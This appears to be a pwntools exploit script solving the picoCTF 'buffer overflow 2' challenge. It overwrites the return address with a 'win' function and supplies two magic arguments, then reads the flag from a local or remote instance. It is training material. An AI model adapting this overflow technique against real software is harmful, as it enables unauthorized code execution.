#!/usr/bin/env python3

from sys import argv
from pwn import *

BIN = './buffer_overflow_2.bin'

IP = 'saturn.picoctf.net'
PORT = 51673

elf = ELF(BIN)


def open_instance():
    if 'remote' in argv:
        return remote(IP, PORT)
    return process(BIN)


p = open_instance()

# generate payload
padding = b'A' * (100 + 12)
win_addr = elf.symbols['win']
arg1 = 0xCAFEF00D
arg2 = 0xF00DF00D
payload = padding + p64(win_addr) + p32(arg1) + p32(arg2)

# send payload
p.readuntil(b'Please enter your string:')
p.sendline(payload)

# read flag
flag = p.recvall().strip()
print(flag[flag.find(b'picoCTF{'):].decode())
